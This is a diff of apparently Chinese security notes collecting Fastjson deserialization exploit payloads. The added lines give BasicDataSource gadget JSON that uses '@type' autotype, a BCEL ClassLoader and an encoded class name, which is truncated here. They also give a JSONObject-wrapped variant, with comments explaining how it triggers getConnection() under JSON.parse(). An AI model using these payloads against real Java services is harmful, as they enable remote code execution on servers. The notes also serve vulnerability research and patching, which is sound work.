@@ -146,14 +146,27 @@ AutoCloseable 任意文件写入
 	}
 }
 BasicDataSource
-
+//如果使用的是JSON.parseObject()进行反序列化操作，会将其转化为JSONObject对象，是Map类的子类，所以就可以执行所有的getter和setter方法
 {
-  "@type" : "org.apache.tomcat.dbcp.dbcp.BasicDataSource",
+  "@type" : "org.apache.tomcat.dbcp.dbcp.BasicDataSource", //下面的是8.0之后的新版包路径，这里是旧版的
   "driverClassName" : "$$BCEL$$$l$8b$I$A$A$A$A...",
   "driverClassLoader" :
   {
     "@type":"Lcom.sun.org.apache.bcel.internal.util.ClassLoader;"
   }
+}
+//但是当使用的是JSON.parse()进行反序列化操作的时候就没有JSON.toJSON()的调用，所以需要在外加一个{}在反序列化的时候生成一个JSONObject对象，之后放在key的位置，在反序列化的过程中key会调用toString()方法，就成功触发了getConnection()。
+{
+    {
+        "@type": "com.alibaba.fastjson.JSONObject",
+        "x":{
+                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",//上面的是旧版包路径
+                "driverClassLoader": {
+                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
+                },
+                "driverClassName": "$$BCEL$$$l$8b$I$A$..."
+        }
+    }: "x"
 }
 JndiConverter
 //<=1.2.62 需要xbean-reflect包
